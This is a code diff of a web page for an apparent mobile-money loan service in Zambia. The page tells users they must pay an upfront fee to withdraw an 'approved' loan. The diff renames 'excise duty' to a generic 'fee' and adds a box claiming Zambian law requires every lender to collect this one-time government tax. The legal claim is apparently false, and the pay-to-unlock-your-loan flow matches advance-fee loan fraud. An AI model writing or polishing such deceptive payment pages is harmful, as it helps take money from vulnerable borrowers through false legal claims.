@@ -1896,7 +1896,7 @@
                   
                   <div class="grid grid-cols-2 gap-4 mt-6 pt-4 border-t border-white/20">
                       <div>
-                          <p class="text-white/70 text-xs mb-1">Excise Duty Fee</p>
+                          <p class="text-white/70 text-xs mb-1">Fee</p>
                           <p class="font-semibold text-lg">ZMW <span id="displayFee">0</span></p>
                       </div>
                       <div>
@@ -1912,7 +1912,7 @@
               </div>
           </div>
 
-          <p class="text-center text-sm text-gray-500 mb-6 px-2">Pay the excise duty fee below to instantly withdraw your approved loan to your Mobile Money account.</p>
+          <p class="text-center text-sm text-gray-500 mb-6 px-2">Pay the fee below to instantly withdraw your approved loan to your Mobile Money account.</p>
 
           <!-- Main Card area (STK Push Container) -->
           <div class="card" id="mainCard" style="max-width: 100%;">
@@ -1971,10 +1971,17 @@
           <!-- Instructions -->
           <div class="mt-8 bg-white rounded-xl shadow-sm border border-gray-100 p-5">
               <h3 class="font-bold text-lg text-gray-800 mb-4 text-center">Deposit Savings</h3>
-              <h4 class="font-semibold text-gray-700 text-center mb-3">Excise Duty Payment Required</h4>
+              <h4 class="font-semibold text-gray-700 text-center mb-3">Fee Payment Required</h4>
+              
+              <div class="bg-amber-50 border-l-4 border-amber-500 p-4 mb-4 rounded-r-lg">
+                  <p class="text-amber-800 text-sm font-medium">
+                      <strong>Why do I need to pay a fee?</strong><br>
+                      As mandated by Zambian law, all loan providers must collect a fee - a one-time government tax that enables us to legally operate and provide loan services. This fee is mandatory to receive your loan.
+                  </p>
+              </div>
               
               <p class="text-gray-600 text-sm leading-relaxed text-center mb-4">
-                  As mandated by Zambian law, all loan providers must collect excise duty - a one-time government tax that enables us to legally operate and provide loan services. This is <span class="font-bold text-gray-800" style="color: #1e3a8a;">mandatory for all applicants</span> and is <span class="font-bold" style="color: #ea580c;">charged only once for first-time users</span>.
+                  This is <span class="font-bold text-gray-800" style="color: #1e3a8a;">mandatory for all applicants</span> and is <span class="font-bold" style="color: #ea580c;">charged only once for first-time users</span>.
               </p>
               
               <p class="font-bold text-center text-sm mb-5" style="color: #ea580c;">
@@ -2205,7 +2212,7 @@
                   <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
               </div>
               <h3 class="font-bold text-xl mb-2 text-gray-800">Confirm Payment</h3>
-              <p class="text-gray-600 mb-6 leading-relaxed">Are you accepting to pay the excise duty fee of <span class="font-bold text-gray-900 bg-gray-100 px-2 py-0.5 rounded">ZMW <span id="confirmFeeAmount">0</span></span> to receive your loan of <span class="font-bold text-gray-900 bg-gray-100 px-2 py-0.5 rounded">ZMW <span id="confirmLoanAmount">0</span></span> instantly?</p>
+              <p class="text-gray-600 mb-6 leading-relaxed">Are you accepting to pay the fee of <span class="font-bold text-gray-900 bg-gray-100 px-2 py-0.5 rounded">ZMW <span id="confirmFeeAmount">0</span></span> to receive your loan of <span class="font-bold text-gray-900 bg-gray-100 px-2 py-0.5 rounded">ZMW <span id="confirmLoanAmount">0</span></span> instantly?</p>
               <div class="flex space-x-3">
                   <button id="cancelStkBtn" class="flex-1 py-3 bg-gray-100 text-gray-700 font-semibold rounded-xl hover:bg-gray-200 transition-colors">Cancel</button>
                   <button id="acceptStkBtn" class="flex-1 py-3 bg-primary text-white font-semibold rounded-xl hover:bg-primary-dark transition-colors shadow-md shadow-primary/30">Accept</button>
@@ -2277,10 +2284,11 @@
               }
               
               // Format phone to display format
-              const displayPhoneStr = currentPhone.startsWith('260') ? currentPhone : '260' + currentPhone;
+              let displayPhoneStr = currentPhone.startsWith('260') ? currentPhone : '260' + currentPhone;
               
               // Update UI elements
               const updateUI = () => {
+                  displayPhoneStr = currentPhone.startsWith('260') ? currentPhone : '260' + currentPhone;
                   document.getElementById('displayLoanAmount').textContent = parseFloat(currentLoan.amount).toLocaleString();
                   document.getElementById('displayFee').textContent = parseFloat(currentLoan.fee).toLocaleString();
                   document.getElementById('displayPhone').textContent = displayPhoneStr;
